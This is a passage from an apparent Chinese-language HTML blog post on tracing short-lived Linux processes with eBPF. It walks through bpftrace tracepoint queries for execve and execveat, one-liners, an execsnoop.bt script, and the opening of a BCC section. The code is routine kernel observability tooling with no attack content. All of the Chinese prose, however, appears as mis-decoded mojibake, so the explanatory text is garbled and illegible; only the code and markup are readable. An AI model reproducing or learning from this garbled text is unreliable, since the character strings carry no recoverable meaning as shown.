å·¥å…·ä¸å®¹æ˜“å‘ç°ï¼›</li><li>ç¬¬äºŒï¼Œåº”ç”¨ç¨‹åºè‡ªèº«åœ¨ä¸åœåœ°å´©æºƒé‡å¯ä¸­ï¼Œä¸”é‡å¯é—´éš”è¾ƒçŸ­ï¼Œå¯åŠ¨è¿‡ç¨‹ä¸­èµ„æºçš„åˆå§‹åŒ–å¯¼è‡´äº†é«˜ CPU ä½¿ç”¨ç‡ã€‚</li></ul><p>ä½¿ç”¨ Â <code>top</code>ã€<code>ps</code>Â  ç­‰æ€§èƒ½å·¥å…·å¾ˆéš¾å‘ç°è¿™ç±»çŸ­æ—¶è¿›ç¨‹ï¼Œè¿™æ˜¯å› ä¸ºå®ƒä»¬éƒ½åªä¼šæŒ‰ç…§ç»™å®šçš„æ—¶é—´é—´éš”é‡‡æ ·ï¼Œè€Œä¸ä¼šå®æ—¶é‡‡é›†åˆ°æ‰€æœ‰æ–°åˆ›å»ºçš„è¿›ç¨‹ã€‚é‚£è¦å¦‚ä½•æ‰èƒ½é‡‡é›†åˆ°æ‰€æœ‰çš„çŸ­æ—¶è¿›ç¨‹å‘¢ï¼Ÿä½ è‚¯å®šå·²ç»æƒ³åˆ°äº†ï¼Œé‚£å°±æ˜¯<strong>åˆ©ç”¨ eBPF çš„äº‹ä»¶è§¦å‘æœºåˆ¶ï¼Œè·Ÿè¸ªå†…æ ¸æ¯æ¬¡æ–°åˆ›å»ºçš„è¿›ç¨‹</strong>ï¼Œè¿™æ ·å°±å¯ä»¥æªå‡ºè¿™äº›çŸ­æ—¶è¿›ç¨‹ã€‚</p><p>è¦è·Ÿè¸ªå†…æ ¸æ–°åˆ›å»ºçš„è¿›ç¨‹ï¼Œé¦–å…ˆå¾—æ‰¾åˆ°è¦è·Ÿè¸ªçš„å†…æ ¸å‡½æ•°æˆ–è·Ÿè¸ªç‚¹ã€‚å¦‚æœä½ äº†è§£è¿‡ Linux ç¼–ç¨‹ä¸­åˆ›å»ºè¿›ç¨‹çš„è¿‡ç¨‹ï¼Œæˆ‘æƒ³ä½ å·²ç»çŸ¥é“äº†ï¼Œåˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹é€šå¸¸éœ€è¦è°ƒç”¨ Â <code>fork()</code>Â  å’Œ Â <code>execve()</code>Â  è¿™ä¸¤ä¸ªæ ‡å‡†å‡½æ•°ï¼Œå®ƒä»¬çš„è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/newProcess.png" class><p>å› ä¸ºæˆ‘ä»¬è¦å…³å¿ƒçš„ä¸»è¦æ˜¯æ–°åˆ›å»ºè¿›ç¨‹çš„åŸºæœ¬ä¿¡æ¯ï¼Œè€Œåƒè¿›ç¨‹åç§°å’Œå‚æ•°ç­‰ä¿¡æ¯éƒ½åœ¨ Â <code>execve()</code>Â  çš„å‚æ•°é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦æ‰¾å‡º Â <code>execve()</code>Â  æ‰€å¯¹åº”çš„å†…æ ¸å‡½æ•°æˆ–è·Ÿè¸ªç‚¹ã€‚</p><p>å€ŸåŠ©åˆšæ‰æåˆ°çš„ Â <code>bpftrace</code>Â  å·¥å…·ï¼Œä½ å¯ä»¥æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼ŒæŸ¥è¯¢æ‰€æœ‰åŒ…å« Â <code>execve</code>Â  å…³é”®å­—çš„è·Ÿè¸ªç‚¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bpftrace -l <span class="string">&#x27;*execve*&#x27;</span></span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ‰§è¡Œåï¼Œä½ ä¼šå¾—åˆ°å¦‚ä¸‹çš„è¾“å‡ºå†…å®¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kprobe:__ia32_compat_sys_execve</span><br><span class="line">kprobe:__ia32_compat_sys_execveat</span><br><span class="line">kprobe:__ia32_sys_execve</span><br><span class="line">kprobe:__ia32_sys_execveat</span><br><span class="line">kprobe:__x32_compat_sys_execve</span><br><span class="line">kprobe:__x32_compat_sys_execveat</span><br><span class="line">kprobe:__x64_sys_execve</span><br><span class="line">kprobe:__x64_sys_execveat</span><br><span class="line">kprobe:audit_log_execve_info</span><br><span class="line">kprobe:bprm_execve</span><br><span class="line">kprobe:do_execveat_common.isra.0</span><br><span class="line">kprobe:kernel_execve</span><br><span class="line">tracepoint:syscalls:sys_enter_execve</span><br><span class="line">tracepoint:syscalls:sys_enter_execveat</span><br><span class="line">tracepoint:syscalls:sys_exit_execve</span><br><span class="line">tracepoint:syscalls:sys_exit_execveat</span><br></pre></td></tr></table></figure><p>ä»è¾“å‡ºä¸­ï¼Œä½ å¯ä»¥å‘ç°è¿™äº›å‡½æ•°å¯ä»¥åˆ†ä¸ºå†…æ ¸æ’æ¡©ï¼ˆkprobeï¼‰å’Œè·Ÿè¸ªç‚¹ï¼ˆtracepointï¼‰ä¸¤ç±»ã€‚åœ¨ä¸Šä¸€å°èŠ‚ä¸­æˆ‘æ›¾æåˆ°ï¼Œå†…æ ¸æ’æ¡©å±äºä¸ç¨³å®šæ¥å£ï¼Œè€Œè·Ÿè¸ªç‚¹åˆ™æ˜¯ç¨³å®šæ¥å£ã€‚å› è€Œï¼Œ<strong>åœ¨å†…æ ¸æ’æ¡©å’Œè·Ÿè¸ªç‚¹ä¸¤è€…éƒ½å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œåº”è¯¥é€‰æ‹©æ›´ç¨³å®šçš„è·Ÿè¸ªç‚¹ï¼Œä»¥ä¿è¯ eBPF ç¨‹åºçš„å¯ç§»æ¤æ€§ï¼ˆå³åœ¨ä¸åŒç‰ˆæœ¬çš„å†…æ ¸ä¸­éƒ½å¯ä»¥æ­£å¸¸æ‰§è¡Œï¼‰</strong>ã€‚</p><p>æ’é™¤æ‰ Â kprobeÂ  ç±»å‹ä¹‹åï¼Œå‰©ä¸‹çš„ Â <code>tracepoint:syscalls:sys_enter_execve</code>ã€<code>tracepoint:syscalls:sys_enter_execveat</code>ã€<code>tracepoint:syscalls:sys_exit_execve</code>Â  ä»¥åŠ Â <code>tracepoint:syscalls:sys_exit_execveat</code>Â  å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„ eBPF è·Ÿè¸ªç‚¹ã€‚å…¶ä¸­ï¼Œ<code>sys_enter_</code>Â  å’Œ Â <code>sys_exit_</code>Â  åˆ†åˆ«è¡¨ç¤ºåœ¨ç³»ç»Ÿè°ƒç”¨çš„å…¥å£å’Œå‡ºå£æ‰§è¡Œã€‚</p><p>åªæœ‰è·Ÿè¸ªç‚¹çš„åˆ—è¡¨è¿˜ä¸å¤Ÿï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æƒ³çŸ¥é“å…·ä½“å¯åŠ¨çš„è¿›ç¨‹åç§°ã€å‘½ä»¤è¡Œé€‰é¡¹ä»¥åŠè¿”å›å€¼ï¼Œè€Œè¿™äº›ä¹Ÿéƒ½å¯ä»¥é€šè¿‡ bpftrace æ¥æŸ¥è¯¢ã€‚åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå³å¯æŸ¥è¯¢ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¯¢sys_enter_execveå…¥å£å‚æ•°</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_enter_execve</span><br><span class="line">tracepoint:syscalls:sys_enter_execve</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    const char * filename</span><br><span class="line">    const char *const * argv</span><br><span class="line">    const char *const * envp</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢sys_exit_execveè¿”å›å€¼</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_exit_execve</span><br><span class="line">tracepoint:syscalls:sys_exit_execve</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    long ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢sys_enter_execveatå…¥å£å‚æ•°</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_enter_execveat</span><br><span class="line">tracepoint:syscalls:sys_enter_execveat</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    int fd</span><br><span class="line">    const char * filename</span><br><span class="line">    const char *const * argv</span><br><span class="line">    const char *const * envp</span><br><span class="line">    int flags</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢sys_exit_execveatè¿”å›å€¼</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_exit_execveat</span><br><span class="line">tracepoint:syscalls:sys_exit_execveat</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    long ret</span><br></pre></td></tr></table></figure><p>ä»è¾“å‡ºä¸­å¯ä»¥çœ‹åˆ°ï¼Œ<code>sys_enter_execveat()</code>Â  æ¯” Â <code>sys_enter_execve()</code>Â  å¤šäº†ä¸¤ä¸ªå‚æ•°ï¼Œè€Œæ–‡ä»¶å Â <code>filename</code>ã€å‘½ä»¤è¡Œé€‰é¡¹ Â <code>argv</code>Â  ä»¥åŠè¿”å›å€¼ Â ret çš„å®šä¹‰éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p><p>åˆ°è¿™é‡Œï¼Œæˆ‘å¸¦ä½ ä½¿ç”¨ bpftrace æŸ¥è¯¢åˆ°äº† execve ç›¸å…³çš„è·Ÿè¸ªç‚¹ï¼Œä»¥åŠè¿™äº›è·Ÿè¸ªç‚¹çš„å…·ä½“æ ¼å¼ã€‚æ¥ä¸‹æ¥ï¼Œä¸ºäº†å¸®ä½ å…¨æ–¹ä½æŒæ¡ eBPF ç¨‹åºçš„å¼€å‘è¿‡ç¨‹ï¼Œæˆ‘ä¼šä»¥ bpftraceã€BCC å’Œ libbpf è¿™ä¸‰ç§æ–¹å¼ä¸ºä¾‹ï¼Œå¸¦ä½ å¼€å‘ä¸€ä¸ªè·Ÿè¸ªçŸ­æ—¶è¿›ç¨‹çš„ eBPF ç¨‹åºã€‚è¿™ä¸‰ç§æ–¹å¼å„æœ‰ä¼˜ç¼ºç‚¹ï¼Œåœ¨å®é™…çš„ç”Ÿäº§ç¯å¢ƒä¸­éƒ½æœ‰å¤§é‡çš„åº”ç”¨ï¼š</p><ul><li><strong>bpftrace é€šå¸¸ç”¨åœ¨å¿«é€Ÿæ’æŸ¥å’Œå®šä½ç³»ç»Ÿä¸Šï¼Œå®ƒæ”¯æŒç”¨å•è¡Œè„šæœ¬çš„æ–¹å¼æ¥å¿«é€Ÿå¼€å‘å¹¶æ‰§è¡Œä¸€ä¸ª eBPF ç¨‹åº</strong>ã€‚ä¸è¿‡ï¼Œbpftrace çš„åŠŸèƒ½æœ‰é™ï¼Œä¸æ”¯æŒç‰¹åˆ«å¤æ‚çš„ eBPF ç¨‹åºï¼Œä¹Ÿä¾èµ–äº BCC å’Œ LLVM åŠ¨æ€ç¼–è¯‘æ‰§è¡Œã€‚</li><li><strong>BCC é€šå¸¸ç”¨åœ¨å¼€å‘å¤æ‚çš„ eBPF ç¨‹åºä¸­ï¼Œå…¶å†…ç½®çš„å„ç§å°å·¥å…·ä¹Ÿæ˜¯ç›®å‰åº”ç”¨æœ€ä¸ºå¹¿æ³›çš„ eBPF å°ç¨‹åº</strong>ã€‚ä¸è¿‡ï¼ŒBCC ä¹Ÿä¸æ˜¯å®Œç¾çš„ï¼Œå®ƒä¾èµ–äº LLVM å’Œå†…æ ¸å¤´æ–‡ä»¶æ‰å¯ä»¥åŠ¨æ€ç¼–è¯‘å’ŒåŠ è½½ eBPF ç¨‹åºã€‚</li><li><strong>libbpf æ˜¯ä»å†…æ ¸ä¸­æŠ½ç¦»å‡ºæ¥çš„æ ‡å‡†åº“ï¼Œç”¨å®ƒå¼€å‘çš„ eBPF ç¨‹åºå¯ä»¥ç›´æ¥åˆ†å‘æ‰§è¡Œï¼Œè¿™æ ·å°±ä¸éœ€è¦æ¯å°æœºå™¨éƒ½å®‰è£… LLVM å’Œå†…æ ¸å¤´æ–‡ä»¶äº†</strong>ã€‚ä¸è¿‡ï¼Œå®ƒè¦æ±‚å†…æ ¸å¼€å¯ BTF ç‰¹æ€§ï¼Œéœ€è¦éå¸¸æ–°çš„å‘è¡Œç‰ˆæ‰ä¼šé»˜è®¤å¼€å¯ï¼ˆå¦‚ RHEL 8.2+ å’Œ Ubuntu 20.10+ ç­‰ï¼‰ã€‚</li></ul><p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œä½ å¯ä»¥æ ¹æ®ä½ çš„å†…æ ¸ç‰ˆæœ¬ã€å†…æ ¸é…ç½®ã€eBPF ç¨‹åºå¤æ‚åº¦ï¼Œä»¥åŠæ˜¯å¦å…è®¸å®‰è£…å†…æ ¸å¤´æ–‡ä»¶å’Œ LLVM ç­‰ç¼–è¯‘å·¥å…·ç­‰ï¼Œæ¥é€‰æ‹©æœ€åˆé€‚çš„æ–¹æ¡ˆã€‚</p><h3 id="bpftrace-æ–¹æ³•"><a href="#bpftrace-æ–¹æ³•" class="headerlink" title="bpftrace æ–¹æ³•"></a>bpftrace æ–¹æ³•</h3><p>è¿™ä¸€è®²æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ï¼Œå¦‚ä½•ä½¿ç”¨ bpftrace æ¥è·Ÿè¸ªçŸ­æ—¶è¿›ç¨‹ã€‚</p><p>ç”±äºÂ <code>execve()</code> å’Œ <code>execveat()</code> è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨çš„å…¥å£å‚æ•°æ–‡ä»¶åÂ <code>filename</code>Â å’Œå‘½ä»¤è¡Œé€‰é¡¹ <code>argv</code>Â ï¼Œä»¥åŠè¿”å›å€¼ Â retÂ  çš„å®šä¹‰éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå› è€Œæˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸¤ä¸ªè·Ÿè¸ªç‚¹æ”¾åˆ°ä¸€èµ·æ¥å¤„ç†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bpftrace -e <span class="string">&#x27;tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat &#123; printf(&quot;%-6d %-8s&quot;, pid, comm); join(args-&gt;argv);&#125;&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/bpftraceTwoProcess.png" class><p>è¿™ä¸ªå‘½ä»¤ä¸­çš„å…·ä½“å†…å®¹å«ä¹‰å¦‚ä¸‹ï¼š</p><ul><li><code>bpftrace -e</code>Â  è¡¨ç¤ºç›´æ¥ä»åé¢çš„å­—ç¬¦ä¸²å‚æ•°ä¸­è¯»å…¥ bpftrace ç¨‹åºï¼ˆé™¤æ­¤ä¹‹å¤–ï¼Œå®ƒè¿˜æ”¯æŒä»æ–‡ä»¶ä¸­è¯»å…¥ bpftrace ç¨‹åºï¼‰ï¼›</li><li><code>tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat</code>Â  è¡¨ç¤ºç”¨é€—å·åˆ†éš”çš„å¤šä¸ªè·Ÿè¸ªç‚¹ï¼Œå…¶åçš„ä¸­æ‹¬å·è¡¨ç¤ºè·Ÿè¸ªç‚¹çš„å¤„ç†å‡½æ•°ï¼›</li><li><code>printf()</code> è¡¨ç¤ºå‘ç»ˆç«¯ä¸­æ‰“å°å­—ç¬¦ä¸²ï¼Œå…¶ç”¨æ³•ç±»ä¼¼äº C è¯­è¨€ä¸­çš„ <code>printf()</code> å‡½æ•°ï¼›</li><li><code>pid</code>Â å’Œ <code>comm</code> æ˜¯ bpftrace å†…ç½®çš„å˜é‡ï¼Œåˆ†åˆ«è¡¨ç¤ºè¿›ç¨‹ PID å’Œè¿›ç¨‹åç§°ï¼ˆä½ å¯ä»¥åœ¨å…¶å®˜æ–¹æ–‡æ¡£ä¸­æ‰¾åˆ°å…¶ä»–çš„å†…ç½®å˜é‡ï¼‰ï¼›</li><li><code>join(args-&gt;argv)</code> è¡¨ç¤ºæŠŠå­—ç¬¦ä¸²æ•°ç»„æ ¼å¼çš„å‚æ•°ç”¨ç©ºæ ¼æ‹¼æ¥èµ·æ¥ï¼Œå†æ‰“å°åˆ°ç»ˆç«¯ä¸­ã€‚å¯¹äºè·Ÿè¸ªç‚¹æ¥è¯´ï¼Œä½ å¯ä»¥ä½¿ç”¨ Â <code>args-&gt;å‚æ•°å</code>Â  çš„æ–¹å¼ç›´æ¥è¯»å–å‚æ•°ï¼ˆæ¯”å¦‚è¿™é‡Œçš„Â <code>args-&gt;argv</code> å°±æ˜¯è¯»å–ç³»ç»Ÿè°ƒç”¨ä¸­çš„ <code>argv</code> å‚æ•°ï¼‰ã€‚</li></ul><p>åœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­æ‰§è¡ŒÂ lsÂ å‘½ä»¤ï¼Œç„¶åä½ ä¼šåœ¨ç¬¬ä¸€ä¸ªç»ˆç«¯ä¸­çœ‹åˆ°å¦‚ä¸‹çš„è¾“å‡ºï¼š</p><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/lsCommand.png" class><p>ä¸€ä¸ªæœ€ç®€å•çš„æ€è·¯å°±æ˜¯åœ¨ç³»ç»Ÿè°ƒç”¨çš„å…¥å£æŠŠå‚æ•°ä¿å­˜åˆ° BPF æ˜ å°„ä¸­ï¼Œç„¶åå†åœ¨ç³»ç»Ÿè°ƒç”¨å‡ºå£è·å–è¿”å›å€¼åä¸€èµ·è¾“å‡ºã€‚æ¯”å¦‚ï¼Œä½ å¯ä»¥å°è¯•æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼ŒæŠŠæ–°è¿›ç¨‹çš„å‚æ•°å­˜å…¥å“ˆå¸Œæ˜ å°„ä¸­ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…¶ä¸­ï¼Œtidè¡¨ç¤ºçº¿ç¨‹IDï¼Œ@execs[tid]è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªå“ˆå¸Œæ˜ å°„</span></span><br><span class="line">sudo bpftrace -e <span class="string">&#x27;tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat &#123;@execs[tid] = join(args-&gt;argv);&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>å¾ˆé—æ†¾ï¼Œè¿™æ¡å‘½ä»¤å¹¶ä¸èƒ½æ­£å¸¸è¿è¡Œã€‚æ ¹æ®ä¸‹é¢çš„é”™è¯¯ä¿¡æ¯ï¼Œä½ å¯ä»¥å‘ç°ï¼Œ<code>join()</code> è¿™ä¸ªå†…ç½®å‡½æ•°æ²¡æœ‰è¿”å›å­—ç¬¦ä¸²ï¼Œä¸èƒ½ç”¨æ¥èµ‹å€¼ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stdin:1:90-106: ERROR: <span class="built_in">join</span>() should not be used <span class="keyword">in</span> an assignment or as a map key</span><br><span class="line">tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat &#123;@execs[1] = <span class="built_in">join</span>(args-&gt;argv);&#125;</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œåœ¨ bpftrace çš„ GitHub é¡µé¢ä¸Šï¼Œå·²ç»æœ‰å…¶ä»–ç”¨æˆ·æ±‡æŠ¥äº†åŒæ ·çš„é—®é¢˜ï¼Œå¹¶ä¸”åˆ°ç°åœ¨è¿˜æ˜¯æ²¡æœ‰è§£å†³ã€‚</p><p>bpftrace æœ¬èº«å¹¶ä¸é€‚ç”¨äºæ‰€æœ‰çš„ eBPF åº”ç”¨ã€‚å¦‚æœæ˜¯å¤æ‚çš„åº”ç”¨ï¼Œæˆ‘è¿˜æ˜¯æ¨èä½¿ç”¨ BCC æˆ–è€… libbpf å¼€å‘ã€‚</p><p>å†ä¸¾ä¸€ç”¨ä¾‹ï¼Œåœ¨è§£å†³çŸ­æ—¶è¿›ç¨‹å¼•å‘çš„æ€§èƒ½é—®é¢˜æ—¶ï¼Œæ‰¾å‡ºçŸ­æ—¶è¿›ç¨‹æ‰æ˜¯æœ€é‡è¦çš„ã€‚è‡³äºçŸ­æ—¶è¿›ç¨‹çš„æ‰§è¡Œç»“æœï¼Œæˆ‘ä»¬ä¸€èˆ¬å¯ä»¥é€šè¿‡æ—¥å¿—çœ‹åˆ°è¯¦ç»†çš„è¿è¡Œè¿‡ç¨‹ã€‚</p><p>ä¸è¿‡ï¼Œè¿™ä¸ªè·Ÿè¸ªç¨‹åºè¿˜æ˜¯æœ‰ä¸€äº›æ¯”è¾ƒå¤§çš„é™åˆ¶ï¼Œæ¯”å¦‚ï¼š</p><ul><li>æ²¡æœ‰è¾“å‡ºæ—¶é—´æˆ³ï¼Œè¿™æ ·å»å¤§é‡æ—¥å¿—é‡Œé¢å®šä½é—®é¢˜å°±æ¯”è¾ƒå›°éš¾ï¼›</li><li>æ²¡æœ‰çˆ¶è¿›ç¨‹ PIDï¼Œè¿˜éœ€è¦ä¸€äº›é¢å¤–çš„å·¥å…·æˆ–ç»éªŒï¼Œæ‰å¯ä»¥æ‰¾å‡ºçˆ¶è¿›ç¨‹ã€‚</li></ul><p>é‚£ä¹ˆï¼Œè¿™äº›é—®é¢˜è¯¥å¦‚ä½•è§£å†³å‘¢ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">---------------- execsnoop.bt -----------------</span><br><span class="line"></span><br><span class="line">#!/usr/bin/bpftrace</span><br><span class="line"></span><br><span class="line">#include &lt;linux/sched.h&gt;</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%-9s %-6s %-6s %-16s %s\n&quot;, &quot;TIME&quot;, &quot;PID&quot;, &quot;PPID&quot;, &quot;COMM&quot;, &quot;ARGS&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_enter_execve,</span><br><span class="line">tracepoint:syscalls:sys_enter_execveat</span><br><span class="line">&#123;</span><br><span class="line">    $task = (struct task_struct *)curtask;</span><br><span class="line"></span><br><span class="line">    time(&quot;%H:%M:%S  &quot;);</span><br><span class="line">    printf(&quot;%-6d %-6d %-16s&quot;, pid, $task-&gt;parent-&gt;tgid, comm);</span><br><span class="line">    join(args-&gt;argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="bpftrace-å°ç»“"><a href="#bpftrace-å°ç»“" class="headerlink" title="bpftrace å°ç»“"></a>bpftrace å°ç»“</h3><p>ä»Šå¤©ï¼Œæˆ‘å¸¦ä½ æ¢³ç†äº†æŸ¥è¯¢ eBPF è·Ÿè¸ªç‚¹çš„å¸¸ç”¨æ–¹æ³•ï¼Œå¹¶ä»¥çŸ­æ—¶è¿›ç¨‹çš„è·Ÿè¸ªä¸ºä¾‹ï¼Œé€šè¿‡ bpftrace å®ç°äº†çŸ­æ—¶è¿›ç¨‹çš„è·Ÿè¸ªç¨‹åºã€‚</p><p>åœ¨è·Ÿè¸ªå†…æ ¸æ—¶ï¼Œä½ è¦è®°å¾—ï¼Œæ‰€æœ‰çš„å†…æ ¸è·Ÿè¸ªéƒ½æ˜¯è¢«å†…æ ¸å‡½æ•°ã€å†…æ ¸è·Ÿè¸ªç‚¹æˆ–æ€§èƒ½äº‹ä»¶ç­‰äº‹ä»¶æºè§¦å‘åæ‰æ‰§è¡Œçš„ã€‚æ‰€ä»¥ï¼Œåœ¨è·Ÿè¸ªå†…æ ¸ä¹‹å‰ï¼Œæˆ‘ä»¬å°±éœ€è¦é€šè¿‡è°ƒè¯•ä¿¡æ¯ã€perfã€bpftrace ç­‰ï¼Œæ‰¾åˆ°è¿™äº›äº‹ä»¶æºï¼Œç„¶åå†åˆ©ç”¨ eBPF æä¾›çš„å¼ºå¤§åŠŸèƒ½å»è·Ÿè¸ªè¿™äº›äº‹ä»¶çš„æ‰§è¡Œè¿‡ç¨‹ã€‚</p><p>bpftrace æ˜¯ä¸€ä¸ªä½¿ç”¨æœ€ä¸ºç®€å•çš„ eBPF å·¥å…·ï¼Œå› æ­¤åœ¨åˆå­¦ eBPF æ—¶ï¼Œå»ºè®®ä½ å¯ä»¥ä»å®ƒå¼€å§‹ã€‚bpftrace æä¾›äº†ä¸€ä¸ªç®€å•çš„è„šæœ¬è¯­è¨€ï¼Œåªéœ€è¦ç®€å•çš„å‡ æ¡è„šæœ¬å°±å¯ä»¥å®ç°å¾ˆä¸°å¯Œçš„ eBPF ç¨‹åºã€‚å®ƒé€šå¸¸ç”¨åœ¨å¿«é€Ÿæ’æŸ¥å’Œå®šä½ç³»ç»Ÿä¸Šï¼Œå¹¶æ”¯æŒç”¨å•è¡Œè„šæœ¬çš„æ–¹å¼æ¥å¿«é€Ÿå¼€å‘å¹¶æ‰§è¡Œä¸€ä¸ª eBPF ç¨‹åºã€‚</p><h2 id="BCC-å¼€å‘å†…æ ¸è¿½è¸ªç¨‹åº"><a href="#BCC-å¼€å‘å†…æ ¸è¿½è¸ªç¨‹åº" class="headerlink" title="BCC å¼€å‘å†…æ ¸è¿½è¸ªç¨‹åº"></a>BCC å¼€å‘å†…æ ¸è¿½è¸ªç¨‹åº</h2><h3 id="BCC-æ–¹æ³•"><a href="#BCC-æ–¹æ³•" class="headerlink" title="BCC æ–¹æ³•"></a>BCC æ–¹æ³•</h3><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹å¦‚ä½•ä½¿ç”¨ BCC æ¥å¼€å‘ä¸Šä¸€è®²ä¸­çŸ­æ—¶è¿›ç¨‹çš„è·Ÿè¸ªç¨‹åºã€‚è¿™é‡Œå…ˆè¯´æ˜ä¸‹ï¼Œç”±äº Â <code>execveat</code>Â  çš„å¤„ç†é€»è¾‘åŒ Â <code>execve</code>Â  åŸºæœ¬ç›¸åŒï¼Œé™äºç¯‡å¹…çš„é•¿åº¦ï¼Œæ¥ä¸‹æ¥çš„ BCC å’Œ libbpf ç¨‹åºéƒ½ä»¥ Â <code>execve</code>Â  ä¸ºä¾‹ã€‚</p><p>è¿™é‡Œå…ˆå›é¡¾ä¸€ä¸‹ä¹‹å‰çš„å†…å®¹ï¼Œä½¿ç”¨ BCC å¼€å‘ eBPF ç¨‹åºåŒ…å«ä¸¤éƒ¨åˆ†</p><ul><li>ç¬¬ä¸€éƒ¨åˆ†æ˜¯ç”¨ C è¯­è¨€å¼€å‘çš„ eBPF ç¨‹åºã€‚åœ¨ eBPF ç¨‹åºä¸­ï¼Œä½ å¯ä»¥åˆ©ç”¨ BCC æä¾›çš„åº“å‡½æ•°å’Œå®å®šä¹‰ç®€åŒ–ä½ çš„å¤„ç†é€»è¾‘ã€‚</li><li>ç¬¬äºŒéƒ¨åˆ†æ˜¯ç”¨ Python è¯­è¨€å¼€å‘çš„å‰ç«¯ç•Œé¢ï¼Œå…¶ä¸­åŒ…å« eBPF ç¨‹åºåŠ è½½ã€æŒ‚è½½åˆ°å†…æ ¸å‡½æ•°å’Œè·Ÿè¸ªç‚¹ï¼Œä»¥åŠé€šè¿‡ BPF æ˜ å°„è·å–å’Œæ‰“å°æ‰§è¡Œç»“æœç­‰éƒ¨åˆ†ã€‚åœ¨å‰ç«¯ç¨‹åºä¸­ï¼Œä½ åŒæ ·å¯ä»¥åˆ©ç”¨ BCC åº“æ¥è®¿é—® BPF æ˜ å°„ã€‚</li></ul><h3 id="æ•°æ®ç»“æ„å®šä¹‰"><a href="#æ•°æ®ç»“æ„å®šä¹‰" class="headerlink" 